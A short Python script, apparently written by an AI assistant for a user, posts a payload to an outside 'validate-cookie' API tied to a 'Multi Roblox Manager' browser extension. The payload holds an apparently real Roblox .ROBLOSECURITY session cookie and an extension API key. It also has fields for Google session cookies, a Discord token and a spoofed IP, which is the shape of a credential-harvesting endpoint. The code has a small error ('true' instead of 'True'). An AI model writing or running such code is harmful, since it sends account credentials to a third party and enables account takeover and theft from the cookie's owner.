import requests

url = "https://rbxnova.com/api/validate-cookie"

# The API key from the previous context
headers = {
    "Content-Type": "application/json",
    "X-Extension-Key": "e745f6a4a86cb87ee3f0b5f06dfaee7f78b5141c164c1ddfe7f791af92eff8ce"
}

# The payload structure provided by the user
payload = {
    "cookie": ".ROBLOSECURITY=_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_CAEQAhoGCAIQBBgBIhwKBGR1aWQSFDExODMxMTA1MTc0NzMzNTgzMDczIhQKBXVuYWneGd4Z3hnMTI4OSISCgN1aWQSCzEwMDQwfuckyozI5NDU5KAM.YuSJGX3MR4ge512I5cPjjzm3cadVnwmh7rVSfaGOfRM5a-5A-yo6THWBY2YO8djBebXSY4RFOqunKSnAzBwJiNK4j97w_WdN6Yyz9XI38KQARzJTvVhMwvz1QyjU_Y5O-5af2Sj3AcVNr_m1S2Acne756lpWLew7LR8PMunQ-rWv_0W5EBzB6m7JeQMlPvHMRzfLNF8iGOubG82_lahxI1jesF1s4LRUot5qvv1vMyxB4qX11FBfx1NK8gcvJOqexMEoq7S273K5AgdQg9EqYeDWD3kgik1LLdTnlHJkOhX75dELFX7f4d3TFezWZXM2aD87A6KH7XDpDQjFaQZibeIMqO5yXEHl4fbdzo_bLquYhNOHX9_oAVU4kn6ngdiadCnOg-k_wcUXhG1mlzQ7S25h8Y2CU49W-atK7IA_mruuvKmafZs1LcJ4beageRJceBI5VGvMFxqEnVbqOe7UIoUHOSvbHqC1dwsTo4X7nGvvlArtKILGalmklGd3nCkq4wiFjtWASQIB-08BAbN4f-Tef5z9FA6PHgU7HbDIlkJGPBGkreTi4-As5SnlVVkHvpe1FKUFzAVHZBmXyEDrvb-0ncGcFMm82M-S2e9TE0VjKwQEQF8IOtyU4bOT96qRkxpVudOr79MQUrzmJ3b_LtcWpRHxqU2MSr8IwnJVY2VId6ZOf8Mtl9B-aoQixVi2h_vq63Q7p4K3Jyy1ZiwhiQxJ4392K1DDABGV56hX9dK8jhMob1D9GB0wBG20M4Xg_is0GWKVkA2iNraDrgecUZzwyOVBMhl41aat016Dm_spJwxZl9i1sZhBkm4rJZMD8hozBPep0CZ8Yyo__cvYSGluF3ttI6SZFfDgSjFoCnnHZzd4pZiGsBOpcsQxOVszvJSiUtlMNAnEVyMqmlFFIg.O7LI0BX-_yO0kpSY-Mucsg7jynk", # This is the critical part
    "itemType": "game",
    "gameName": "hi", # Sending "hi" as the game name
    "installId": "inst_xxxxx",
    "extensionSlug": "multi-roblox-manager",
    "extensionDisplayTitle": "Multi Roblox Manager",
    "multiRoblox": true,
    "tool": "multiple-roblox",
    "accountsTab": True,
    "accountsAddFlow": True,
    "_chromeCookieJar": "[{\"name\": \"_ROBLOSECURITY\", \"value\": \"YOUR_REAL_COOKIE_HERE\"}]",
    "googleAuth": {
        "SID": "placeholder",
        "HSID": "placeholder",
        "SSID": "placeholder",
        "SAPISID": "placeholder"
    },
    "discordToken": "placeholder",
    "_realIp": "127.0.0.1"
}

response = requests.post(url, headers=headers, json=payload)

print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
